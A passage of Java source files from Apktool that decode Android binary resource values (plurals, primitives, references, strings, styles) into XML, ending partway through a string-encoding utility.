            case TYPE_DYNAMIC_REFERENCE:
                return new ResReference(pkg, ResId.of(data));
            case TYPE_ATTRIBUTE:
            case TYPE_DYNAMIC_ATTRIBUTE:
                return new ResReference(pkg, ResId.of(data), true);
            case TYPE_FLOAT:
            case TYPE_DIMENSION:
            case TYPE_FRACTION:
                return new ResPrimitive(type, data);
        }
        // Handle integer, boolean and color.
        if (type >= TYPE_FIRST_INT && type <= TYPE_LAST_INT) {
            return new ResPrimitive(type, data);
        }
        Log.w(TAG, "Invalid value type: 0x%02x", type);
        return null;
    }

    public int getType() {
        return mType;
    }

    public String getFormat() {
        switch (mType) {
            case TYPE_NULL:
                return null;
            case TYPE_REFERENCE:
            case TYPE_DYNAMIC_REFERENCE:
            case TYPE_ATTRIBUTE:
            case TYPE_DYNAMIC_ATTRIBUTE:
                return "reference";
            case TYPE_STRING:
                return "string";
            case TYPE_FLOAT:
                return "float";
            case TYPE_DIMENSION:
                return "dimension";
            case TYPE_FRACTION:
                return "fraction";
            case TYPE_INT_BOOLEAN:
                return "boolean";
        }
        if (mType >= TYPE_FIRST_COLOR_INT && mType <= TYPE_LAST_COLOR_INT) {
            return "color";
        }
        if (mType >= TYPE_FIRST_INT && mType <= TYPE_LAST_INT) {
            return "integer";
        }
        Log.w(TAG, "Unexpected value type: 0x%02x", mType);
        return null;
    }

    // Must never return null.
    public abstract String toXmlTextValue() throws AndrolibException;

    // Must never return null.
    public String toXmlAttributeValue() throws AndrolibException {
        return toXmlTextValue();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResPlural.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.xml.ResStringEncoder;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;

public class ResPlural extends ResBag {
    private static final String TAG = ResPlural.class.getName();

    private static final int ATTR_OTHER = 0x01000004;
    private static final int ATTR_ZERO = 0x01000005;
    private static final int ATTR_ONE = 0x01000006;
    private static final int ATTR_TWO = 0x01000007;
    private static final int ATTR_FEW = 0x01000008;
    private static final int ATTR_MANY = 0x01000009;

    private final RawItem[] mItems;

    public ResPlural(ResReference parent, RawItem[] items) {
        super(parent);
        assert items != null;
        mItems = items;
    }

    public static ResPlural parse(ResReference parent, RawItem[] rawItems) {
        return new ResPlural(parent, rawItems);
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String tagName = "plurals";
        serial.startTag(null, tagName);
        serial.attribute(null, "name", entry.getName());

        for (RawItem item : mItems) {
            int key = item.getKey();
            String quantity;
            switch (key) {
                case ATTR_OTHER:
                    quantity = "other";
                    break;
                case ATTR_ZERO:
                    quantity = "zero";
                    break;
                case ATTR_ONE:
                    quantity = "one";
                    break;
                case ATTR_TWO:
                    quantity = "two";
                    break;
                case ATTR_FEW:
                    quantity = "few";
                    break;
                case ATTR_MANY:
                    quantity = "many";
                    break;
                default:
                    Log.w(TAG, "Invalid plurals key: 0x%08x", key);
                    continue;
            }

            ResItem value = item.getValue();
            String body = value.toXmlTextValue();
            if (!body.isEmpty()) {
                body = ResStringEncoder.normalizeFormatSpecifiers(body);
            }

            serial.startTag(null, "item");
            serial.attribute(null, "quantity", quantity);
            serial.text(body);
            serial.endTag(null, "item");
        }

        serial.endTag(null, tagName);
    }

    @Override
    public String toString() {
        return String.format("ResPlural{items=%s}", Arrays.toString(mItems));
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResPlural) {
            ResPlural other = (ResPlural) obj;
            return Arrays.equals(mItems, other.mItems);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Arrays.hashCode(mItems);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResPrimitive.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Locale;
import java.util.Objects;
import java.util.Set;

public class ResPrimitive extends ResItem {
    private static final String TAG = ResPrimitive.class.getName();

    // Complex data
    private static final int COMPLEX_UNIT_MASK = 0xF;
    private static final int COMPLEX_RADIX_SHIFT = 4;
    private static final int COMPLEX_RADIX_MASK = 0x3;
    private static final int COMPLEX_MANTISSA_SHIFT = 8;
    private static final int COMPLEX_MANTISSA_MASK = 0xFFFFFF;
    private static final float MANTISSA_MULT = 1.0f / (1 << COMPLEX_MANTISSA_SHIFT);
    private static final float[] RADIX_MULTS = {
        MANTISSA_MULT, 1.0f / (1 << 7) * MANTISSA_MULT, 1.0f / (1 << 15) * MANTISSA_MULT,
        1.0f / (1 << 23) * MANTISSA_MULT
    };

    // Complex units in TYPE_DIMENSION
    private static final int COMPLEX_UNIT_PX = 0;
    private static final int COMPLEX_UNIT_DIP = 1;
    private static final int COMPLEX_UNIT_SP = 2;
    private static final int COMPLEX_UNIT_PT = 3;
    private static final int COMPLEX_UNIT_IN = 4;
    private static final int COMPLEX_UNIT_MM = 5;

    // Complex units in TYPE_FRACTION
    private static final int COMPLEX_UNIT_FRACTION = 0;
    private static final int COMPLEX_UNIT_FRACTION_PARENT = 1;

    public static final ResPrimitive NULL = new ResPrimitive(TYPE_NULL, DATA_NULL_UNDEFINED);
    public static final ResPrimitive EMPTY = new ResPrimitive(TYPE_NULL, DATA_NULL_EMPTY);
    public static final ResPrimitive FALSE = new ResPrimitive(TYPE_INT_BOOLEAN, 0);
    public static final ResPrimitive TRUE = new ResPrimitive(TYPE_INT_BOOLEAN, 0xFFFFFFFF);

    private final int mData;

    public ResPrimitive(int type, int data) {
        super(type);
        mData = data;
    }

    public int getData() {
        return mData;
    }

    @Override
    public String toXmlTextValue() {
        switch (mType) {
            case TYPE_NULL:
                return mData == DATA_NULL_EMPTY ? "@empty" : "@null";
            case TYPE_FLOAT:
                return floatToString(Float.intBitsToFloat(mData));
            case TYPE_DIMENSION: {
                String value = floatToString(complexToFloat(mData));
                int unitType = mData & COMPLEX_UNIT_MASK;
                switch (unitType) {
                    case COMPLEX_UNIT_PX:
                        value += "px";
                        break;
                    case COMPLEX_UNIT_DIP:
                        value += "dp";
                        break;
                    case COMPLEX_UNIT_SP:
                        value += "sp";
                        break;
                    case COMPLEX_UNIT_PT:
                        value += "pt";
                        break;
                    case COMPLEX_UNIT_IN:
                        value += "in";
                        break;
                    case COMPLEX_UNIT_MM:
                        value += "mm";
                        break;
                    default:
                        Log.w(TAG, "Unexpected value unit: " + unitType);
                        value += "??";
                        break;
                }
                return value;
            }
            case TYPE_FRACTION: {
                String value = floatToString(complexToFloat(mData) * 100);
                int unitType = mData & COMPLEX_UNIT_MASK;
                switch (unitType) {
                    case COMPLEX_UNIT_FRACTION:
                        value += "%";
                        break;
                    case COMPLEX_UNIT_FRACTION_PARENT:
                        value += "%p";
                        break;
                    default:
                        Log.w(TAG, "Unexpected value unit: " + unitType);
                        value += "??";
                        break;
                }
                return value;
            }
            case TYPE_INT_BOOLEAN:
                return mData != 0 ? "true" : "false";
        }
        if (mType >= TYPE_FIRST_COLOR_INT && mType <= TYPE_LAST_COLOR_INT) {
            switch (mType) {
                default:
                case TYPE_INT_COLOR_ARGB8:
                    return String.format("#%08x", mData);
                case TYPE_INT_COLOR_RGB8:
                    return String.format("#%06x", mData & 0xFFFFFF);
                case TYPE_INT_COLOR_ARGB4:
                    return String.format("#%x%x%x%x",
                        (mData >>> 28) & 0xF, (mData >>> 20) & 0xF,
                        (mData >>> 12) & 0xF, (mData >>> 4) & 0xF);
                case TYPE_INT_COLOR_RGB4:
                    return String.format("#%x%x%x",
                        (mData >>> 20) & 0xF, (mData >>> 12) & 0xF,
                        (mData >>> 4) & 0xF);
            }
        }
        if (mType >= TYPE_FIRST_INT && mType <= TYPE_LAST_INT) {
            switch (mType) {
                default:
                case TYPE_INT_DEC:
                    return Integer.toString(mData);
                case TYPE_INT_HEX:
                    return String.format("0x%x", mData);
            }
        }
        Log.w(TAG, "Unexpected value type: 0x%02x", mType);
        return "";
    }

    private static String floatToString(float value) {
        // Use one decimal to show it's a float for exact integers.
        if (value == (long) value) {
            return String.format(Locale.ROOT, "%.1f", value);
        }
        // Use Java's default minimal string representation.
        return Float.toString(value);
    }

    private static float complexToFloat(int complex) {
        return (complex & (COMPLEX_MANTISSA_MASK << COMPLEX_MANTISSA_SHIFT))
                * RADIX_MULTS[(complex >> COMPLEX_RADIX_SHIFT) & COMPLEX_RADIX_MASK];
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String typeName = entry.getType().getName();

        // Specify format for <item> tags when the resource type doesn't directly support this value's format.
        Set<String> stdFormats = STANDARD_TYPE_FORMATS.get(typeName);
        String format = stdFormats != null ? getFormat() : null;
        boolean asItem = format != null && !stdFormats.contains(format);

        String tagName = asItem ? "item" : typeName;
        serial.startTag(null, tagName);
        if (asItem) {
            serial.attribute(null, "type", typeName);
        }
        serial.attribute(null, "name", entry.getName());
        if (asItem) {
            serial.attribute(null, "format", format);
        }
        serial.text(toXmlTextValue());
        serial.endTag(null, tagName);
    }

    @Override
    public String toString() {
        return String.format("ResPrimitive{type=0x%02x, data=0x%08x}", mType, mData);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResPrimitive) {
            ResPrimitive other = (ResPrimitive) obj;
            return mType == other.mType
                && mData == other.mData;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mType, mData);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResReference.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.exceptions.UndefinedResObjectException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.ResEntrySpec;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResPackage;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Objects;

public class ResReference extends ResItem {
    private final ResPackage mPackage;
    private final ResId mResId;
    private final boolean mAsAttr;

    public ResReference(ResPackage pkg, ResId resId) {
        this(pkg, resId, false);
    }

    public ResReference(ResPackage pkg, ResId resId, boolean asAttr) {
        super(asAttr ? TYPE_ATTRIBUTE : TYPE_REFERENCE);
        assert pkg != null && resId != null;
        mPackage = pkg;
        mResId = resId;
        mAsAttr = asAttr;
    }

    public ResPackage getPackage() {
        return mPackage;
    }

    public ResId getResId() {
        return mResId;
    }

    public ResEntrySpec resolve() throws AndrolibException {
        if (mPackage != null && mResId != ResId.NULL) {
            ResId resId = fixDynamicResourceId(mResId);
            try {
                return mPackage.getTable().resolve(resId);
            } catch (UndefinedResObjectException ignored) {
            }
        }
        return null;
    }

    public ResEntry resolveEntry() throws AndrolibException {
        if (mPackage != null && mResId != ResId.NULL) {
            ResId resId = fixDynamicResourceId(mResId);
            try {
                return mPackage.getTable().resolveEntry(resId);
            } catch (UndefinedResObjectException ignored) {
            }
        }
        return null;
    }

    private ResId fixDynamicResourceId(ResId resId) {
        if (resId.pkgId() == 0 && mPackage.getId() != 0) {
            // If the package ID is 0x00, that means that a shared library is accessing its own local resource,
            // so fix it up with calling package ID.
            resId = ResId.of(mPackage.getId(), resId.typeId(), resId.entryId());
        }
        return resId;
    }

    @Override
    public String toXmlTextValue() throws AndrolibException {
        ResEntrySpec spec = resolve();
        if (spec == null) {
            // @null is a special primitive, not a true reference, but we have to fall back to it if we can't
            // resolve the reference.
            return "@null";
        }

        boolean includePackage = mPackage.getGroup() != spec.getPackage().getGroup();
        boolean includeType = !mAsAttr || !spec.getTypeSpec().getName().equals("attr");
        return (mAsAttr ? "?" : "@")
             + (includePackage ? spec.getPackage().getName() + ":" : "")
             + (includeType ? spec.getTypeSpec().getName() + "/" : "")
             + spec.getName();
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String typeName = entry.getType().getName();

        // A bag type with a reference value must be an <item> tag.
        // Otherwise, when the decoded app is rebuilt, the reference will be lost.
        boolean asItem = entry.getType().isBagType();

        // Only set body if not @null or the entry is a <string> tag.
        // @null is the default value for all item types except string.
        // Note: We never set @null to <id> tags.
        boolean needsBody = resolve() != null || typeName.equals("string");

        String tagName = asItem ? "item" : typeName;
        serial.startTag(null, tagName);
        if (asItem) {
            serial.attribute(null, "type", typeName);
        }
        serial.attribute(null, "name", entry.getName());
        if (needsBody) {
            serial.text(toXmlTextValue());
        }
        serial.endTag(null, tagName);
    }

    @Override
    public String toString() {
        return String.format("ResReference{pkg=%s, id=%s, type=%s}", mPackage, mResId, mAsAttr ? "attr" : "ref");
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResReference) {
            ResReference other = (ResReference) obj;
            return mPackage.equals(other.mPackage)
                && mResId == other.mResId
                && mAsAttr == other.mAsAttr;
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mPackage, mResId, mAsAttr);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResString.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.xml.ResStringEncoder;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Set;

public class ResString extends ResItem {
    public static final ResString EMPTY = new ResString("");

    private final CharSequence mValue;

    public ResString(CharSequence value) {
        super(TYPE_STRING);
        assert value != null;
        mValue = value;
    }

    public CharSequence getValue() {
        return mValue;
    }

    @Override
    public String toXmlTextValue() {
        return ResStringEncoder.encodeTextValue(mValue);
    }

    @Override
    public String toXmlAttributeValue() {
        return ResStringEncoder.encodeAttributeValue(mValue);
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String typeName = entry.getType().getName();

        // Specify format for <item> tags when the resource type doesn't directly support this value's format.
        Set<String> stdFormats = STANDARD_TYPE_FORMATS.get(typeName);
        String format = stdFormats != null ? getFormat() : null;
        boolean asItem = format != null && !stdFormats.contains(format);

        String tagName = asItem ? "item" : typeName;
        serial.startTag(null, tagName);
        if (asItem) {
            serial.attribute(null, "type", typeName);
        }
        serial.attribute(null, "name", entry.getName());
        if (asItem) {
            serial.attribute(null, "format", format);
        }
        if (!asItem && !isFormatted()) {
            serial.attribute(null, "formatted", "false");
        }
        String body = toXmlTextValue();
        if (!body.isEmpty()) {
            serial.text(body);
        }
        serial.endTag(null, tagName);
    }

    private boolean isFormatted() {
        if (mValue.length() == 0) {
            return true;
        }
        // Formatting must be disabled if the string has multiple sequential format specifier.
        int[][] specs = ResStringEncoder.findFormatSpecifiers(mValue.toString());
        int[] sequential = specs[0];
        int[] positional = specs[1];
        return sequential.length == 0 || sequential.length + positional.length <= 1;
    }

    @Override
    public String toString() {
        return String.format("ResString{value=%s}", mValue);
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResString) {
            ResString other = (ResString) obj;
            return mValue.equals(other.mValue);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return mValue.hashCode();
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResStyle.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

import brut.androlib.exceptions.AndrolibException;
import brut.androlib.res.table.ResEntry;
import brut.androlib.res.table.ResEntrySpec;
import brut.androlib.res.table.ResId;
import brut.androlib.res.table.ResPackage;
import brut.common.Log;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Objects;
import java.util.Set;

public class ResStyle extends ResBag {
    private static final String TAG = ResStyle.class.getName();

    private final Item[] mItems;

    public ResStyle(ResReference parent, Item[] items) {
        super(parent);
        assert parent != null && items != null;
        mItems = items;
    }

    public static ResStyle parse(ResReference parent, RawItem[] rawItems) {
        Item[] items = new Item[rawItems.length];
        ResPackage pkg = parent.getPackage();

        for (int i = 0; i < rawItems.length; i++) {
            RawItem rawItem = rawItems[i];
            // A reference to the XML attribute.
            int keyId = rawItem.getKey();
            ResReference key = new ResReference(pkg, ResId.of(keyId));
            ResItem value = rawItem.getValue();

            items[i] = new Item(key, value);
        }

        return new ResStyle(parent, items);
    }

    public static class Item {
        private final ResReference mKey;
        private final ResItem mValue;

        public Item(ResReference key, ResItem value) {
            assert key != null && value != null;
            mKey = key;
            mValue = value;
        }

        public ResReference getKey() {
            return mKey;
        }

        public ResItem getValue() {
            return mValue;
        }
    }

    @Override
    public void resolveKeys() throws AndrolibException {
        ResPackage pkg = mParent.getPackage();
        boolean skipUnresolved = pkg.getTable().getConfig().isDecodeResolveLazy();

        for (Item item : mItems) {
            ResReference key = item.getKey();
            if (key.resolveEntry() != null) {
                continue;
            }

            ResId keyId = key.getResId();

            // #2836 - Skip item if the resource cannot be resolved.
            if (skipUnresolved || keyId.pkgId() != pkg.getId()) {
                Log.w(TAG, "Unresolved style reference: key=%s, value=%s", key, item.getValue());
                continue;
            }

            pkg.addEntrySpec(keyId.typeId(), keyId.entryId(), ResEntrySpec.DUMMY_PREFIX + keyId);
            pkg.addEntry(keyId.typeId(), keyId.entryId(), ResAttribute.DEFAULT);
        }
    }

    @Override
    public void serializeToValuesXml(XmlSerializer serial, ResEntry entry) throws AndrolibException, IOException {
        String tagName = "style";
        serial.startTag(null, tagName);
        serial.attribute(null, "name", entry.getName());
        if (mParent.resolve() != null) {
            serial.attribute(null, "parent", mParent.toXmlAttributeValue());
        } else if (entry.getName().indexOf('.') != -1) {
            serial.attribute(null, "parent", "");
        }

        ResPackage pkg = mParent.getPackage();
        boolean skipDuplicates = !pkg.getTable().getConfig().isAnalysisMode();
        Set<ResId> processedKeys = new HashSet<>();
        for (Item item : mItems) {
            ResReference key = item.getKey();
            ResEntry keyEntry = key.resolveEntry();
            if (keyEntry == null) {
                continue;
            }

            ResId keyId = key.getResId();

            // #3400 - Skip duplicate items in styles.
            if (skipDuplicates && processedKeys.contains(keyId)) {
                continue;
            }

            processedKeys.add(keyId);

            boolean includePackage = pkg.getGroup() != keyEntry.getPackage().getGroup();
            String keyName = (includePackage ? keyEntry.getPackage().getName() + ":" : "") + keyEntry.getName();

            ResItem value = item.getValue();
            String body;
            if (keyEntry.getValue() instanceof ResAttribute) {
                // Format the value with the attribute entry's value.
                ResAttribute keyValue = (ResAttribute) keyEntry.getValue();
                body = keyValue.formatAsTextValue(value);
            } else {
                Log.w(TAG, "Unexpected style item key: " + keyEntry);
                // Format the value with the default attribute.
                body = ResAttribute.DEFAULT.formatAsTextValue(value);
            }

            serial.startTag(null, "item");
            serial.attribute(null, "name", keyName);
            serial.text(body);
            serial.endTag(null, "item");
        }

        serial.endTag(null, tagName);
    }

    @Override
    public String toString() {
        return String.format("ResStyle{parent=%s, items=%s}", mParent, Arrays.toString(mItems));
    }

    @Override
    public boolean equals(Object obj) {
        if (obj == this) {
            return true;
        }
        if (obj instanceof ResStyle) {
            ResStyle other = (ResStyle) obj;
            return mParent.equals(other.mParent)
                && Arrays.equals(mItems, other.mItems);
        }
        return false;
    }

    @Override
    public int hashCode() {
        return Objects.hash(mParent, Arrays.hashCode(mItems));
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/table/value/ResValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.table.value;

public abstract class ResValue {
    // The value contains no data.
    public static final int TYPE_NULL = 0x00;
    // The data field holds a resource identifier.
    public static final int TYPE_REFERENCE = 0x01;
    // The data field holds an attribute resource identifier (referencing an attribute in the current theme style, not
    // a resource entry).
    public static final int TYPE_ATTRIBUTE = 0x02;
    // The string field holds string data. In addition, if data is non-zero then it is the string block index of the
    // string and assetCookie is the set of assets the string came from.
    public static final int TYPE_STRING = 0x03;
    // The data field holds an IEEE 754 floating point number.
    public static final int TYPE_FLOAT = 0x04;
    // The data field holds a complex number encoding a dimension value.
    public static final int TYPE_DIMENSION = 0x05;
    // The data field holds a complex number encoding a fraction of a container.
    public static final int TYPE_FRACTION = 0x06;
    // The data holds a dynamic res table reference, which needs to be resolved before it can be used like
    // TYPE_REFERENCE.
    public static final int TYPE_DYNAMIC_REFERENCE = 0x07;
    // The data an attribute resource identifier, which needs to be resolved before it can be used like a
    // TYPE_ATTRIBUTE.
    public static final int TYPE_DYNAMIC_ATTRIBUTE = 0x08;
    // Identifies the start of plain integer values. Any type value from this to TYPE_LAST_INT means the data field
    // holds a generic integer value.
    public static final int TYPE_FIRST_INT = 0x10;
    // The data field holds a number that was originally specified in decimal.
    public static final int TYPE_INT_DEC = 0x10;
    // The data field holds a number that was originally specified in hexadecimal (0xn).
    public static final int TYPE_INT_HEX = 0x11;
    // The data field holds 0 or 1 that was originally specified as "false" or "true".
    public static final int TYPE_INT_BOOLEAN = 0x12;
    // Identifies the start of integer values that were specified as color constants (starting with '#').
    public static final int TYPE_FIRST_COLOR_INT = 0x1C;
    // The data field holds a color that was originally specified as #AARRGGBB.
    public static final int TYPE_INT_COLOR_ARGB8 = 0x1C;
    // The data field holds a color that was originally specified as #RRGGBB.
    public static final int TYPE_INT_COLOR_RGB8 = 0x1D;
    // The data field holds a color that was originally specified as #ARGB.
    public static final int TYPE_INT_COLOR_ARGB4 = 0x1E;
    // The data field holds a color that was originally specified as #RGB.
    public static final int TYPE_INT_COLOR_RGB4 = 0x1F;
    // Identifies the end of integer values that were specified as color constants.
    public static final int TYPE_LAST_COLOR_INT = 0x1F;
    // Identifies the end of plain integer values.
    public static final int TYPE_LAST_INT = 0x1F;

    // TYPE_NULL data indicating the value was not specified.
    public static final int DATA_NULL_UNDEFINED = 0;
    // TYPE_NULL data indicating the value was explicitly set to null.
    public static final int DATA_NULL_EMPTY = 1;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/xml/ResStringEncoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.xml;

import brut.androlib.res.data.StyledString;
import brut.androlib.res.table.value.ResAttribute;
import brut.util.TextUtils;

import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Deque;
import java.util.regex.Pattern;

public final class ResStringEncoder {
    private static final Pattern TAG_SPLIT_PATTERN = Pattern.compile(";(?=[\\p{L}_][\\p{L}\\p{N}_.-]*=)");

    private ResStringEncoder() {
        // Private constructor for utility class.
    }

    public static String encodeTextValue(CharSequence text) {
        return text instanceof StyledString
            ? encodeStyledString((StyledString) text)
            : encodeRawString(text.toString(), 0);
    }

    public static String encodeAttributeValue(CharSequence text) {
        return encodeAttributeValue(text, ResAttribute.ATTR_TYPE_ANY);
    }

    public static String encodeAttributeValue(CharSequence text, int attrType) {
        return encodeRawString(text.toString(), attrType);
    }

    private static String encodeStyledString(StyledString styledStr) {
        String str = styledStr.getValue();
        StyledString.Span[] spans = styledStr.getSpans();
        int len = str.length();
        if (len == 0 && spans.length == 0) {
            return "";
        }

        StringBuilder out = new StringBuilder(len * 2);
        Deque<StyledString.Span> stack = new ArrayDeque<>();

        int offset = 0;
        for (int i = 0; i <= spans.length; i++) {
            int prevOffset = offset;
            StyledString.Span span;
            if (i < spans.length) {
                span = spans[i];
                offset = span.getFirstChar();
            } else {
                span = null;
                offset = len;
            }

            // Close nested spans that end before the current offset.
            while (!stack.isEmpty() && stack.peek().getLastChar() < offset) {
                StyledString.Span prevSpan = stack.pop();
                int prevSpanEnd = prevSpan.getLastChar() + 1;

                // Flush any remaining text inside this span.
                if (prevOffset < prevSpanEnd) {
                    appendEscapedString(out, str, prevOffset, prevSpanEnd, 0, true);
                    prevOffset = prevSpanEnd;
                }

                // Write the closing tag.
                String prevTag = prevSpan.getTag();
                int prevTagEnd = prevTag.indexOf(';');
                if (prevTagEnd == -1) {
                    prevTagEnd = prevTag.length();
                }
                out.append("</").append(prevTag, 0, prevTagEnd).append('>');
            }

            // Ignore spans that start beyond nested spans.
            if (prevOffset > offset) {
                continue;
            }

            // Flush any text between tags.
            if (prevOffset < offset) {
                appendEscapedString(out, str, prevOffset, offset, 0, true);
            }

            // Break if all spans have been handled.
            if (span == null) {
                break;
            }

            // Start current span.
            int spanEnd = span.getLastChar() + 1;
            String tag = span.getTag();
            int tagEnd = tag.indexOf(';');
            if (tagEnd == -1) {
                tagEnd = tag.length();
            }
            // Ignore this span if the tag is missing.
            if (tagEnd == 0) {
                continue;
            }

            // Write the opening tag.
            out.append('<').append(tag, 0, tagEnd);

            // Append the attributes.
            if (tagEnd < tag.length()) {
                for (String attr : TAG_SPLIT_PATTERN.split(tag.substring(tagEnd + 1))) {
                    int attrLen = attr.length();
                    if (attrLen == 0) {
                        continue;
                    }
                    int nameEnd = attr.indexOf('=');
                    if (nameEnd == -1) {
                        continue;
                    }
                    int valueStart = nameEnd + 1;
                    out.append(' ').append(attr, 0, valueStart).append('"');
                    if (valueStart < attrLen) {
                        appendTagAttributeValue(out, attr, valueStart, attrLen);
                    }
                    out.append('"');
                }
            }

            // Write as a self-closing tag if needed.
            if (offset == spanEnd) {
                out.append("/>");
                continue;
            }

            // Push onto the stack for inner text and possible nested spans.
            out.append('>');
            stack.push(span);
        }

        return out.toString();
    }

    private static String encodeRawString(String str, int attrType) {
        int len = str.length();
        if (len == 0) {
            return "";
        }

        StringBuilder out = new StringBuilder(len * 2);
        appendEscapedString(out, str, 0, len, attrType, false);

        // Raw strings might get encoded as typed values in edge cases. We skip this if the string has been quoted.
